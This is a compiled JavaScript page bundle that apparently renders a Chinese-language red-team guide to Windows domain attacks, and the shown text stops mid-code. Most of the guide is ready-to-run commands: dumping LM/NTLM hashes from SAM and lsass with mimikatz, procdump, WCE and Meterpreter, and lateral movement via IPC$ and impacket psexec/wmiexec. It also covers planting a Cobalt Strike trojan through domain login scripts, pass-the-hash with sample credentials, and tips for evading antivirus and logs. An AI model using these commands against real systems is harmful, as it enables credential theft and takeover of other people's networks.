(window.__LOADABLE_LOADED_CHUNKS__=window.__LOADABLE_LOADED_CHUNKS__||[]).push([[31],{173:function(e,a,t){"use strict";t.r(a),function(e){t.d(a,"default",(function(){return N}));var n,c=t(95),b=(t(139),t(0),t(96));function s(){return(s=Object.assign||function(e){for(var a=1;a<arguments.length;a++){var t=arguments[a];for(var n in t)Object.prototype.hasOwnProperty.call(t,n)&&(e[n]=t[n])}return e}).apply(this,arguments)}function r(e,a){if(null==e)return{};var t,n,c=function(e,a){if(null==e)return{};var t,n,c={},b=Object.keys(e);for(n=0;n<b.length;n++)t=b[n],a.indexOf(t)>=0||(c[t]=e[t]);return c}(e,a);if(Object.getOwnPropertySymbols){var b=Object.getOwnPropertySymbols(e);for(n=0;n<b.length;n++)t=b[n],a.indexOf(t)>=0||Object.prototype.propertyIsEnumerable.call(e,t)&&(c[t]=e[t])}return c}(n="undefined"!=typeof reactHotLoaderGlobal?reactHotLoaderGlobal.enterModule:void 0)&&n(e);"undefined"!=typeof reactHotLoaderGlobal&&reactHotLoaderGlobal.default.signature;var p,l,m=function(e){return function(a){return console.warn("Component "+e+" was not imported, exported, or provided by MDXProvider as global scope"),Object(b.b)("div",a)}},o={},i="wrapper";function N(e){var a=e.components,t=r(e,["components"]);return Object(b.b)(i,s({},o,t,{components:a,mdxType:"MDXLayout"}),Object(b.b)("h1",{className:"__internal",id:"lm-hash和ntml-hash"},"LM Hash和NTML Hash",Object(b.b)("a",s({parentName:"h1"},{href:"#lm-hash%E5%92%8Cntml-hash","aria-hidden":!0,className:"anchor"}),"#")),Object(b.b)("p",null,"Windows操作系统中的密码由两部分加密组成，即",Object(b.b)("inlineCode",{parentName:"p"},"LM Hash"),"和",Object(b.b)("inlineCode",{parentName:"p"},"NTML Hash"),"。"),Object(b.b)("p",null,"LM Hash（LAN Manager Hash），本质为DES加密，密码不足14位用",Object(b.b)("inlineCode",{parentName:"p"},"0"),"补全。"),Object(b.b)("p",null,"自",Object(b.b)("inlineCode",{parentName:"p"},"Server 2003"),"之后，Windows的认证方式均为NTML Hash。"),Object(b.b)("p",null,"自",Object(b.b)("inlineCode",{parentName:"p"},"Server 2008"),"开始默认禁用",Object(b.b)("inlineCode",{parentName:"p"},"LM Hash"),"， 当密码超过14位时候会采用NTLM加密"),Object(b.b)("p",null,"如果抓取的",Object(b.b)("inlineCode",{parentName:"p"},"LM Hash"),"为 ",Object(b.b)("inlineCode",{parentName:"p"},"AAD3B435B51404EEAAD3B435B51404EE"),"，说明密码为空或",Object(b.b)("inlineCode",{parentName:"p"},"LM Hash"),"被禁用。"),Object(b.b)("table",null,Object(b.b)("thead",{parentName:"table"},Object(b.b)("tr",{parentName:"thead"},Object(b.b)("th",s({parentName:"tr"},{align:"left"})),Object(b.b)("th",s({parentName:"tr"},{align:"left"}),"2000"),Object(b.b)("th",s({parentName:"tr"},{align:"left"}),"xp"),Object(b.b)("th",s({parentName:"tr"},{align:"left"}),"2003"),Object(b.b)("th",s({parentName:"tr"},{align:"left"}),"Vista"),Object(b.b)("th",s({parentName:"tr"},{align:"left"}),"win7"),Object(b.b)("th",s({parentName:"tr"},{align:"left"}),"2008"),Object(b.b)("th",s({parentName:"tr"},{align:"left"}),"2012"))),Object(b.b)("tbody",{parentName:"table"},Object(b.b)("tr",{parentName:"tbody"},Object(b.b)("td",s({parentName:"tr"},{align:"left"}),"LM"),Object(b.b)("td",s({parentName:"tr"},{align:"left"}),"√"),Object(b.b)("td",s({parentName:"tr"},{align:"left"}),"√"),Object(b.b)("td",s({parentName:"tr"},{align:"left"}),"√"),Object(b.b)("td",s({parentName:"tr"},{align:"left"})),Object(b.b)("td",s({parentName:"tr"},{align:"left"})),Object(b.b)("td",s({parentName:"tr"},{align:"left"})),Object(b.b)("td",s({parentName:"tr"},{align:"left"}))),Object(b.b)("tr",{parentName:"tbody"},Object(b.b)("td",s({parentName:"tr"},{align:"left"}),"NTLM"),Object(b.b)("td",s({parentName:"tr"},{align:"left"}),"√"),Object(b.b)("td",s({parentName:"tr"},{align:"left"}),"√"),Object(b.b)("td",s({parentName:"tr"},{align:"left"}),"√"),Object(b.b)("td",s({parentName:"tr"},{align:"left"}),"√"),Object(b.b)("td",s({parentName:"tr"},{align:"left"}),"√"),Object(b.b)("td",s({parentName:"tr"},{align:"left"}),"√"),Object(b.b)("td",s({parentName:"tr"},{align:"left"}),"√")))),Object(b.b)("p",null," 前面三个，当密码超过14位时候会采用NTLM加密。"),Object(b.b)("p",null,Object(b.b)("strong",{parentName:"p"},"Hash一般存储在两个地方")),Object(b.b)("blockquote",null,Object(b.b)("p",{parentName:"blockquote"},Object(b.b)("strong",{parentName:"p"},"SAM文件"),"：存储在本机，对应本地用户"),Object(b.b)("p",{parentName:"blockquote"},Object(b.b)("strong",{parentName:"p"},"NTDS.DIT文件"),"：存储在域控上，对应域用户")),Object(b.b)("hr",null),Object(b.b)("p",null,"关于内网协议的深入研究可以参考 daiker 师傅的总结（Kerberos、NTML、LDAP）"),Object(b.b)("p",null,"地址：",Object(b.b)("a",s({parentName:"p"},{href:"https://daiker.gitbook.io/windows-protocol/",target:"_blank"}),"https://daiker.gitbook.io/windows-protocol/")," "),Object(b.b)("p",null,Object(b.b)("strong",{parentName:"p"},"比较老的工具")),Object(b.b)("p",null,Object(b.b)("inlineCode",{parentName:"p"},"WCE"),"、",Object(b.b)("inlineCode",{parentName:"p"},"Pwdump7"),"、",Object(b.b)("inlineCode",{parentName:"p"},"Quarks PwDump"),"等（都会被杀软查杀）"),Object(b.b)("div",{className:"rcpress-highlight","data-language":"bash"},Object(b.b)("pre",s({parentName:"div"},{className:"language-bash"}),Object(b.b)("code",s({parentName:"pre"},{className:"language-bash"}),"PwDump7.exe\nQuarksPwDump.exe --dump-hash-local"))),Object(b.b)("p",null," ",Object(b.b)("strong",{parentName:"p"},"WCE"),"常用于列出登录会话，以及列出、、修改、删除关联凭据（LM Hash、NTLM Hash、明文密码和kerberos票据）"),Object(b.b)("div",{className:"rcpress-highlight","data-language":"bash"},Object(b.b)("pre",s({parentName:"div"},{className:"language-bash"}),Object(b.b)("code",s({parentName:"pre"},{className:"language-bash"}),Object(b.b)("span",s({parentName:"code"},{className:"token comment"}),"#抓系统管理员明文密码"),"\nwce.exe -w\n\n",Object(b.b)("span",s({parentName:"code"},{className:"token comment"}),"#抓hash，列出登录的会话和NTLM凭据"),"\nwce.exe -l\n\n",Object(b.b)("span",s({parentName:"code"},{className:"token comment"}),"#重点，在无法破解目标hash明文的情况下可用hash注入"),"\nwce.exe -s 目标用户名:目标域名或IP:LM-HASH:NT-HASHwce.exe -s Administrator:192.168.2.130:F0D412BD764FFE81AAD3B435B51404EE:209C6174DA490CAEB422F3FA5A7AE634"))),Object(b.b)("blockquote",null,Object(b.b)("p",{parentName:"blockquote"},"hash注入的原理是，将我们预备好的目标机器的本地或者是域用户hash注入到本地的认证进程",Object(b.b)("inlineCode",{parentName:"p"},"lsass.exe"),"中去"),Object(b.b)("p",{parentName:"blockquote"},"使得本地在使用",Object(b.b)("inlineCode",{parentName:"p"},"ipc"),"登录目标机器的时候就如同自己登录自己的机器一样获得权限")),Object(b.b)("h2",{className:"__internal",id:"无工具利用注册表--mimikatz本地读取（推荐）"},"无工具利用注册表 + mimikatz本地读取（推荐）",Object(b.b)("a",s({parentName:"h2"},{href:"#%E6%97%A0%E5%B7%A5%E5%85%B7%E5%88%A9%E7%94%A8%E6%B3%A8%E5%86%8C%E8%A1%A8--mimikatz%E6%9C%AC%E5%9C%B0%E8%AF%BB%E5%8F%96%EF%BC%88%E6%8E%A8%E8%8D%90%EF%BC%89","aria-hidden":!0,className:"anchor"}),"#")),Object(b.b)("p",null,Object(b.b)("strong",{parentName:"p"},"（1）导出SAM和System文件")),Object(b.b)("p",null," Win2000和XP需要先提到",Object(b.b)("inlineCode",{parentName:"p"},"SYSTEM"),"，03开始直接可以reg save"),Object(b.b)("div",{className:"rcpress-highlight","data-language":"bash"},Object(b.b)("pre",s({parentName:"div"},{className:"language-bash"}),Object(b.b)("code",s({parentName:"pre"},{className:"language-bash"}),"reg save hklm",Object(b.b)("span",s({parentName:"code"},{className:"token punctuation"}),"\\"),"sam sam.hive\nreg save hklm",Object(b.b)("span",s({parentName:"code"},{className:"token punctuation"}),"\\"),"system system.hive\nreg save hklm",Object(b.b)("span",s({parentName:"code"},{className:"token punctuation"}),"\\"),"security security.hive"))),Object(b.b)("p",null,Object(b.b)("strong",{parentName:"p"},"（2）mimikatz本地读取 NTML Hash")),Object(b.b)("blockquote",null,Object(b.b)("p",{parentName:"blockquote"},"mimikatz可以从内存中提取明文编码、散列值、PIN和Kerberos票据；"),Object(b.b)("p",{parentName:"blockquote"},"还可以用来执行哈希传递、票据传递和构建黄金票据（Golden Ticket）。")),Object(b.b)("div",{className:"rcpress-highlight","data-language":"bash"},Object(b.b)("pre",s({parentName:"div"},{className:"language-bash"}),Object(b.b)("code",s({parentName:"pre"},{className:"language-bash"}),Object(b.b)("span",s({parentName:"code"},{className:"token comment"}),"#将导出的文件和mimikatz放到同一目录"),"\nmimikatz.exelsadump::sam /sam:sam.hive /system:system.hive /security:security.hive"))),Object(b.b)("h2",{className:"__internal",id:"sharpdump"},"Sharpdump",Object(b.b)("a",s({parentName:"h2"},{href:"#sharpdump","aria-hidden":!0,className:"anchor"}),"#")),Object(b.b)("p",null,"需要.NET 3.5版本框架"),Object(b.b)("p",null," 下载地址：",Object(b.b)("a",s({parentName:"p"},{href:"https://github.com/GhostPack/SharpDump",target:"_blank"}),"https://github.com/GhostPack/SharpDump")," "),Object(b.b)("h2",{className:"__internal",id:"procdump--mimikatz本地读取"},"Procdump + mimikatz本地读取",Object(b.b)("a",s({parentName:"h2"},{href:"#procdump--mimikatz%E6%9C%AC%E5%9C%B0%E8%AF%BB%E5%8F%96","aria-hidden":!0,className:"anchor"}),"#")),Object(b.b)("p",null,Object(b.b)("strong",{parentName:"p"},"（1） Procdump dump lsass（管理员权限下运行 ）")),Object(b.b)("div",{className:"rcpress-highlight","data-language":"bash"},Object(b.b)("pre",s({parentName:"div"},{className:"language-bash"}),Object(b.b)("code",s({parentName:"pre"},{className:"language-bash"}),Object(b.b)("span",s({parentName:"code"},{className:"token comment"}),"#32位系统"),"\nprocdump.exe -accepteula -ma lsass.exe lsass.dmp\n\n",Object(b.b)("span",s({parentName:"code"},{className:"token comment"}),"#64位系统"),"\nprocdump.exe -accepteula -64 -ma lsass.exe lsass.dmp"))),Object(b.b)("p",null,Object(b.b)("strong",{parentName:"p"},"（2）mimikatz本地读取hash")),Object(b.b)("div",{className:"rcpress-highlight","data-language":"bash"},Object(b.b)("pre",s({parentName:"div"},{className:"language-bash"}),Object(b.b)("code",s({parentName:"pre"},{className:"language-bash"}),Object(b.b)("span",s({parentName:"code"},{className:"token comment"}),"#放到同一目录"),"\nsekurlsa::minidump lsass.dmp\nsekurlsa::logonPasswords full"))),Object(b.b)("h2",{className:"__internal",id:"msf模块"},"MSF模块",Object(b.b)("a",s({parentName:"h2"},{href:"#msf%E6%A8%A1%E5%9D%97","aria-hidden":!0,className:"anchor"}),"#")),Object(b.b)("p",null,"如果你有一个SYSTEM权限的",Object(b.b)("inlineCode",{parentName:"p"},"Metepreter"),"会话，可以直接",Object(b.b)("inlineCode",{parentName:"p"},"hashdump"),"（只能dump本地用户）"),Object(b.b)("div",{className:"rcpress-highlight","data-language":"text"},Object(b.b)("pre",s({parentName:"div"},{className:"language-text"}),Object(b.b)("code",s({parentName:"pre"},{className:"language-text"}),"meterpreter> hashdump"))),Object(b.b)("p",null,Object(b.b)("strong",{parentName:"p"},"smart_hashdump")),Object(b.b)("p",null,"可以dump本地 + 域用户hash"),Object(b.b)("div",{className:"rcpress-highlight","data-language":"text"},Object(b.b)("pre",s({parentName:"div"},{className:"language-text"}),Object(b.b)("code",s({parentName:"pre"},{className:"language-text"}),"use post/windows/gather/smart_hashdump"))),Object(b.b)("p",null,Object(b.b)("strong",{parentName:"p"},"加载第三方模块")),Object(b.b)("p",null,Object(b.b)("strong",{parentName:"p"},"KIWI")),Object(b.b)("div",{className:"rcpress-highlight","data-language":"bash"},Object(b.b)("pre",s({parentName:"div"},{className:"language-bash"}),Object(b.b)("code",s({parentName:"pre"},{className:"language-bash"}),"meterpreter",Object(b.b)("span",s({parentName:"code"},{className:"token operator"}),">")," load kiwi\nmeterpreter",Object(b.b)("span",s({parentName:"code"},{className:"token operator"}),">")," creds_all\nmeterpreter",Object(b.b)("span",s({parentName:"code"},{className:"token operator"}),">")," lsa_dump_sam"))),Object(b.b)("p",null,Object(b.b)("strong",{parentName:"p"},"mimikatz")),Object(b.b)("div",{className:"rcpress-highlight","data-language":"bash"},Object(b.b)("pre",s({parentName:"div"},{className:"language-bash"}),Object(b.b)("code",s({parentName:"pre"},{className:"language-bash"}),"meterpreter",Object(b.b)("span",s({parentName:"code"},{className:"token operator"}),">")," load mimikatz\nmeterpreter",Object(b.b)("span",s({parentName:"code"},{className:"token operator"}),">")," msv\nmeterpreter",Object(b.b)("span",s({parentName:"code"},{className:"token operator"}),">")," kerberostials"))),Object(b.b)("p",null,"（",Object(b.b)("strong",{parentName:"p"},"以上MSF模块，都需要SYSTEM权限"),"）"),Object(b.b)("h2",{className:"__internal",id:"mimikatz在线读取sam文件获取hash"},"mimikatz在线读取SAM文件获取Hash",Object(b.b)("a",s({parentName:"h2"},{href:"#mimikatz%E5%9C%A8%E7%BA%BF%E8%AF%BB%E5%8F%96sam%E6%96%87%E4%BB%B6%E8%8E%B7%E5%8F%96hash","aria-hidden":!0,className:"anchor"}),"#")),Object(b.b)("p",null,"将mimikatz上传到目标主机，需要免杀，并且要SYSTEM权限。"),Object(b.b)("div",{className:"rcpress-highlight","data-language":"bash"},Object(b.b)("pre",s({parentName:"div"},{className:"language-bash"}),Object(b.b)("code",s({parentName:"pre"},{className:"language-bash"}),Object(b.b)("span",s({parentName:"code"},{className:"token comment"}),"#运行mimikatz,提升权限并读取SAM文件，获取NTML Hash"),"\nmimikatz.exe ",Object(b.b)("span",s({parentName:"code"},{className:"token string"}),'"privilege::debug"')," ",Object(b.b)("span",s({parentName:"code"},{className:"token string"}),'"token::elevate"')," ",Object(b.b)("span",s({parentName:"code"},{className:"token string"}),'"lsadump::sam"')," ",Object(b.b)("span",s({parentName:"code"},{className:"token builtin class-name"}),"exit"),"\n\n",Object(b.b)("span",s({parentName:"code"},{className:"token comment"}),"#读取散列值和明文密码"),"\nmimikatz.exe ",Object(b.b)("span",s({parentName:"code"},{className:"token string"}),'"privilege::debug"')," ",Object(b.b)("span",s({parentName:"code"},{className:"token string"}),'"log"')," ",Object(b.b)("span",s({parentName:"code"},{className:"token string"}),'"sekurlsa::logonpasswords"')," ",Object(b.b)("span",s({parentName:"code"},{className:"token builtin class-name"}),"exit")))),Object(b.b)("h1",{className:"__internal",id:"指定主机上线"},"指定主机上线",Object(b.b)("a",s({parentName:"h1"},{href:"#%E6%8C%87%E5%AE%9A%E4%B8%BB%E6%9C%BA%E4%B8%8A%E7%BA%BF","aria-hidden":!0,className:"anchor"}),"#")),Object(b.b)("h2",{className:"__internal",id:"ipc命名管道连接"},"IPC命名管道连接",Object(b.b)("a",s({parentName:"h2"},{href:"#ipc%E5%91%BD%E5%90%8D%E7%AE%A1%E9%81%93%E8%BF%9E%E6%8E%A5","aria-hidden":!0,className:"anchor"}),"#")),Object(b.b)("p",null,Object(b.b)("strong",{parentName:"p"},"利用条件")),Object(b.b)("p",null,"1、目标开启139、445端口"),Object(b.b)("p",null,"2、管理员开启默认共享（admin$、c$、d$等）"),Object(b.b)("p",null,Object(b.b)("strong",{parentName:"p"},"建立一个连接")),Object(b.b)("div",{className:"rcpress-highlight","data-language":"bash"},Object(b.b)("pre",s({parentName:"div"},{className:"language-bash"}),Object(b.b)("code",s({parentName:"pre"},{className:"language-bash"}),"net use ",Object(b.b)("span",s({parentName:"code"},{className:"token punctuation"}),"\\"),Object(b.b)("span",s({parentName:"code"},{className:"token punctuation"}),"\\"),"目标IP",Object(b.b)("span",s({parentName:"code"},{className:"token punctuation"}),"\\"),"ipc$ ",Object(b.b)("span",s({parentName:"code"},{className:"token string"}),'"密码"')," /user:账号\n\n",Object(b.b)("span",s({parentName:"code"},{className:"token comment"}),"#查看当前已建立的连接"),"\nnet use\n\n",Object(b.b)("span",s({parentName:"code"},{className:"token comment"}),"#列出目标目录文件"),"\n",Object(b.b)("span",s({parentName:"code"},{className:"token function"}),"dir")," ",Object(b.b)("span",s({parentName:"code"},{className:"token punctuation"}),"\\"),Object(b.b)("span",s({parentName:"code"},{className:"token punctuation"}),"\\"),"目标IP",Object(b.b)("span",s({parentName:"code"},{className:"token punctuation"}),"\\"),"c$\n\n",Object(b.b)("span",s({parentName:"code"},{className:"token comment"}),"#映射共享磁盘到本地"),"\nnet use z: ",Object(b.b)("span",s({parentName:"code"},{className:"token punctuation"}),"\\"),Object(b.b)("span",s({parentName:"code"},{className:"token punctuation"}),"\\"),"IP",Object(b.b)("span",s({parentName:"code"},{className:"token punctuation"}),"\\"),"c$ ",Object(b.b)("span",s({parentName:"code"},{className:"token string"}),'"密码"')," /user:",Object(b.b)("span",s({parentName:"code"},{className:"token string"}),'"用户名"'),"\n\n",Object(b.b)("span",s({parentName:"code"},{className:"token comment"}),"#删除连接"),"\nnet user ",Object(b.b)("span",s({parentName:"code"},{className:"token punctuation"}),"\\"),Object(b.b)("span",s({parentName:"code"},{className:"token punctuation"}),"\\"),"目标IP",Object(b.b)("span",s({parentName:"code"},{className:"token punctuation"}),"\\"),"ipc$ /del\n\n",Object(b.b)("span",s({parentName:"code"},{className:"token comment"}),"#删除共享映射"),"\nnet use * /del"))),Object(b.b)("h2",{className:"__internal",id:"无防火墙"},"无防火墙",Object(b.b)("a",s({parentName:"h2"},{href:"#%E6%97%A0%E9%98%B2%E7%81%AB%E5%A2%99","aria-hidden":!0,className:"anchor"}),"#")),Object(b.b)("p",null,Object(b.b)("strong",{parentName:"p"},"psexec、wmiexec等方式获取指定主机命令执行权限")),Object(b.b)("p",null,"impacket工具包：",Object(b.b)("a",s({parentName:"p"},{href:"https://github.com/SecureAuthCorp/impacket",target:"_blank"}),"https://github.com/SecureAuthCorp/impacket")),Object(b.b)("p",null,Object(b.b)("strong",{parentName:"p"},"impacket工具包中的PsExec")),Object(b.b)("div",{className:"rcpress-highlight","data-language":"bash"},Object(b.b)("pre",s({parentName:"div"},{className:"language-bash"}),Object(b.b)("code",s({parentName:"pre"},{className:"language-bash"}),"python psexec.py 用户名:密码@目标IPpython psexec.py Administrator:@hack.51463708@10.1.1.14"))),Object(b.b)("p",null,"会直接反弹一个SYSTEM权限的shell。"),Object(b.b)("blockquote",null,Object(b.b)("p",{parentName:"blockquote"},"随着PsExec在内网中被严格监控，越来越多的杀毒厂商已经把PsExec加入了黑名单；"),Object(b.b)("p",{parentName:"blockquote"},"而且PsExec执行程序时会创建一个psexec服务，并产生大量日志，可以通过日志反推攻击流程。")),Object(b.b)("p",null,Object(b.b)("strong",{parentName:"p"},"使用WMI执行程序（目标需开放135端口）")),Object(b.b)("p",null,"WMI是Windows的一个管理工具集，Windows默认不会把WMI的操作记录到日志中"),Object(b.b)("p",null,Object(b.b)("strong",{parentName:"p"},"impacket工具包中的wmiexec")),Object(b.b)("div",{className:"rcpress-highlight","data-language":"bash"},Object(b.b)("pre",s({parentName:"div"},{className:"language-bash"}),Object(b.b)("code",s({parentName:"pre"},{className:"language-bash"}),"python wmiexec.py administrator:@hack.51463708@10.1.1.14"))),Object(b.b)("p",null,Object(b.b)("strong",{parentName:"p"},"Impacket中的smbexec.py")," "),Object(b.b)("div",{className:"rcpress-highlight","data-language":"bash"},Object(b.b)("pre",s({parentName:"div"},{className:"language-bash"}),Object(b.b)("code",s({parentName:"pre"},{className:"language-bash"}),"python smbexec.py administrator:@hack.51463708@10.1.1.14"))),Object(b.b)("h2",{className:"__internal",id:"防火墙全开"},"防火墙全开",Object(b.b)("a",s({parentName:"h2"},{href:"#%E9%98%B2%E7%81%AB%E5%A2%99%E5%85%A8%E5%BC%80","aria-hidden":!0,className:"anchor"}),"#")),Object(b.b)("p",null,Object(b.b)("strong",{parentName:"p"},"1、通过组策略下发命令执行")),Object(b.b)("p",null,"改一下这个",Object(b.b)("a",s({parentName:"p"},{href:"https://3gstudent.github.io/3gstudent.github.io/%E5%9F%9F%E6%B8%97%E9%80%8F-%E5%88%A9%E7%94%A8GPO%E4%B8%AD%E7%9A%84%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1%E5%AE%9E%E7%8E%B0%E8%BF%9C%E7%A8%8B%E6%89%A7%E8%A1%8C/",target:"_blank"}),"三好学生的脚本"),"就能用"),Object(b.b)("p",null,Object(b.b)("strong",{parentName:"p"},"2、通过设置登陆脚本上线指定用户")),Object(b.b)("blockquote",null,Object(b.b)("p",{parentName:"blockquote"}," IPC连接到域控，copy文件，在成员上执行 "),Object(b.b)("p",{parentName:"blockquote"}," login.bat 是cs生成的马")),Object(b.b)("p",null,"一）使用dsmod给指定域用户设置登陆脚本"),Object(b.b)("p",null,"login.bat放在域控的NETLOGON目录下面"),Object(b.b)("div",{className:"rcpress-highlight","data-language":"bash"},Object(b.b)("pre",s({parentName:"div"},{className:"language-bash"}),Object(b.b)("code",s({parentName:"pre"},{className:"language-bash"}),"copy login.bat ",Object(b.b)("span",s({parentName:"code"},{className:"token punctuation"}),"\\"),Object(b.b)("span",s({parentName:"code"},{className:"token punctuation"}),"\\"),"域控",Object(b.b)("span",s({parentName:"code"},{className:"token punctuation"}),"\\"),"SYSVOL",Object(b.b)("span",s({parentName:"code"},{className:"token punctuation"}),"\\"),"sysvol",Object(b.b)("span",s({parentName:"code"},{className:"token punctuation"}),"\\"),"域名",Object(b.b)("span",s({parentName:"code"},{className:"token punctuation"}),"\\"),"SCRIPTS",Object(b.b)("span",s({parentName:"code"},{className:"token punctuation"}),"\\"),"login.bat\ndsmod user -loscr ",Object(b.b)("span",s({parentName:"code"},{className:"token string"}),'"test.bat"')," ",Object(b.b)("span",s({parentName:"code"},{className:"token string"}),'"CN=x,OU=x,DC=x,DC=x,DC=x"')))),Object(b.b)("p",null,"二）登陆脚本给指定用户种马"),Object(b.b)("p",null,"login.bat放在域控的NETLOGON目录下面"),Object(b.b)("div",{className:"rcpress-highlight","data-language":"bash"},Object(b.b)("pre",s({parentName:"div"},{className:"language-bash"}),Object(b.b)("code",s({parentName:"pre"},{className:"language-bash"}),"copy login.bat ",Object(b.b)("span",s({parentName:"code"},{className:"token punctuation"}),"\\"),Object(b.b)("span",s({parentName:"code"},{className:"token punctuation"}),"\\"),"域控",Object(b.b)("span",s({parentName:"code"},{className:"token punctuation"}),"\\"),"SYSVOL",Object(b.b)("span",s({parentName:"code"},{className:"token punctuation"}),"\\"),"sysvol",Object(b.b)("span",s({parentName:"code"},{className:"token punctuation"}),"\\"),"域名",Object(b.b)("span",s({parentName:"code"},{className:"token punctuation"}),"\\"),"SCRIPTS",Object(b.b)("span",s({parentName:"code"},{className:"token punctuation"}),"\\"),"test.bat\nnet user xp /scriptpath:login.bat ",Object(b.b)("span",s({parentName:"code"},{className:"token comment"}),"# 内网域成员机器可以使用bash"),"\ngpupdate /force           ",Object(b.b)("span",s({parentName:"code"},{className:"token comment"}),"# 立即刷新组策略 使用域管权限执行  不执行也行,等待随机")))),Object(b.b)("h1",{className:"__internal",id:"hash传递攻击"},"Hash传递攻击",Object(b.b)("a",s({parentName:"h1"},{href:"#hash%E4%BC%A0%E9%80%92%E6%94%BB%E5%87%BB","aria-hidden":!0,className:"anchor"}),"#")),Object(b.b)("blockquote",null,Object(b.b)("p",{parentName:"blockquote"},"哈希传递（Pass The Hash）攻击，直接将",Object(b.b)("inlineCode",{parentName:"p"},"NTML Hash"),"的散列值传递到其它主机，进行权限认证，获取控制权。"),Object(b.b)("p",{parentName:"blockquote"},"在域环境中，用户大都使用域账号登录，大量计算机在安装时会使用相同的本地管理员账号和密码；"),Object(b.b)("p",{parentName:"blockquote"},"因此，",Object(b.b)("strong",{parentName:"p"},"如果计算机的本地账户名密码和目标相同"),"，就能通过哈希传递攻击获取目标主机控制权。"),Object(b.b)("p",{parentName:"blockquote"},Object(b.b)("strong",{parentName:"p"},"想要使用mimikatz的哈希传递功能，必须具有本地管理员权限（mimikatz需要高权限进程lsass.exe的执行权限）"))),Object(b.b)("h2",{className:"__internal",id:"一、使用ntml-hash进行哈希传递"},"一、使用NTML Hash进行哈希传递",Object(b.b)("a",s({parentName:"h2"},{href:"#%E4%B8%80%E3%80%81%E4%BD%BF%E7%94%A8ntml-hash%E8%BF%9B%E8%A1%8C%E5%93%88%E5%B8%8C%E4%BC%A0%E9%80%92","aria-hidden":!0,className:"anchor"}),"#")),Object(b.b)("p",null,Object(b.b)("strong",{parentName:"p"},"（1）在目标机器中以管理员权限运行mimikatz")),Object(b.b)("div",{className:"rcpress-highlight","data-language":"bash"},Object(b.b)("pre",s({parentName:"div"},{className:"language-bash"}),Object(b.b)("code",s({parentName:"pre"},{className:"language-bash"}),"mimikatz.exe ",Object(b.b)("span",s({parentName:"code"},{className:"token string"}),'"privilege::debug"')," ",Object(b.b)("span",s({parentName:"code"},{className:"token string"}),'"sekurlsa::pth /user:Administrator /domain:wintrysec.lab /ntlm:<NTML Hash>"'),"\n",Object(b.b)("span",s({parentName:"code"},{className:"token comment"}),"#<NTML Hash>为：f3a0acba8bcfb8a0896281bbfcb793ed这样的一串字符")))),Object(b.b)("p",null,Object(b.b)("strong",{parentName:"p"},"（2）列出目标域控C盘内容"),"（会自动弹出一个cmd.exe）"),Object(b.b)("div",{className:"rcpress-highlight","data-language":"bash"},Object(b.b)("pre",s({parentName:"div"},{className:"language-bash"}),Object(b.b)("code",s({parentName:"pre"},{className:"language-bash"}),Object(b.b)("span",s({parentName:"code"},{className:"token function"}),"dir")," ",Object(b.b)("span",s({parentName:"code"},{className:"token punctuation"}),"\\"),Object(b.b)("span",s({parentName:"code"},{className:"token punctuation"}),"\\"),"DC",Object(b.b)("span",s({parentName:"code"},{className:"token punctuation"}),"\\"),"c$   ",Object(b.b)("span",s({parentName:"code"},{className:"token comment"}),"#测试是否成功")))),Object(b.b)("h2",{className:"__internal",id:"二、使用aes-256进行哈希传递"},"二、使用AES-256进行哈希传递",Object(b.b)("a",s({parentName:"h2"},{href:"#%E4%BA%8C%E3%80%81%E4%BD%BF%E7%94%A8aes-256%E8%BF%9B%E8%A1%8C%E5%93%88%E5%B8%8C%E4%BC%A0%E9%80%92","aria-hidden":!0,className:"anchor"}),"#")),Object(b.b)("blockquote",null,Object(b.b)("p",{parentName:"blockquote"},"当系统安装了",Object(b.b)("inlineCode",{parentName:"p"},"KB2871997"),"补丁，将无法使用常规的哈希传递攻击；"),Object(b.b)("p",{parentName:"blockquote"},"但是SID为500的Admintrator用户，依然可以使用哈希传递，或者使用AES-256进行哈希传递。")),Object(b.b)("p",null,Object(b.b)("strong",{parentName:"p"},"（1）抓取AES-256密钥")),Object(b.b)("div",{className:"rcpress-highlight","data-language":"bash"},Object(b.b)("pre",s({parentName:"div"},{className:"language-bash"}),Object(b.b)("code",s({parentName:"pre"},{className:"language-bash"}),"mimikatz.exe ",Object(b.b)("span",s({parentName:"code"},{className:"token string"}),'"privilege::debug"')," ",Object(b.b)("span",s({parentName:"code"},{className:"token string"}),'"sekurlsa::ekeys"')))),Object(b.b)("p",null,Object(b.b)("strong",{parentName:"p"},"（2）管理员权限运行mimikatz")),Object(b.b)("div",{className:"rcpress-highlight","data-language":"bash"},Object(b.b)("pre",s({parentName:"div"},{className:"language-bash"}),Object(b.b)("code",s({parentName:"pre"},{className:"language-bash"}),"mimikatz ",Object(b.b)("span",s({parentName:"code"},{className:"token string"}),'"privilege::debug"')," ",Object(b.b)("span",s({parentName:"code"},{className:"token string"}),'"sekurlsa::pth /user:Administrator /domain:wintryse.lab /aes256:<AES-256密钥>"')))),Object(b.b)("h2",{className:"__internal",id:"三、不使用mimikatz进行哈希传递"},"三、不使用mimikatz进行哈希传递",Object(b.b)("a",s({parentName:"h2"},{href:"#%E4%B8%89%E3%80%81%E4%B8%8D%E4%BD%BF%E7%94%A8mimikatz%E8%BF%9B%E8%A1%8C%E5%93%88%E5%B8%8C%E4%BC%A0%E9%80%92","aria-hidden":!0,className:"anchor"}),"#")),Object(b.b)("p",null,Object(b.b)("strong",{parentName:"p"},"使用impacket软件包")),Object(b.b)("div",{className:"rcpress-highlight","data-language":"bash"},Object(b.b)("pre",s({parentName:"div"},{className:"language-bash"}),Object(b.b)("code",s({parentName:"pre"},{className:"language-bash"}),"psexec.py -hashes :",Object(b.b)("span",s({parentName:"code"},{className:"token operator"}),"<"),"hash",Object(b.b)("span",s({parentName:"code"},{className:"token operator"}),">")," 域/域用户名@目标IP\nsmbexec.py -hashes :",Object(b.b)("span",s({parentName:"code"},{className:"token operator"}),"<"),"hash",Object(b.b)("span",s({parentName:"code"},{className:"token operator"}),">")," 域/域用户名@目标IP\nwmiexec.py -hashes :",Object(b.b)("span",s({parentName:"code"},{className:"token operator"}),"<"),"hash",Object(b.b)("span",s({parentName:"code"},{className:"token operator"}),">")," 域/域用户名r@目标IP ",Object(b.b)("span",s({parentName:"code"},{className:"token function"}),"whoami")))),Object(b.b)("p",null,Object(b.b)("strong",{parentName:"p"},"MSF模块")),Object(b.b)("div",{className:"rcpress-highlight","data-language":"bash"},Object(b.b)("pre",s({parentName:"div"},{className:"language-bash"}),Object(b.b)("code",s({parentName:"pre"},{className:"language-bash"}),"use exploit/windows/smb/psexec\n\n",Object(b.b)("span",s({parentName:"code"},{className:"token 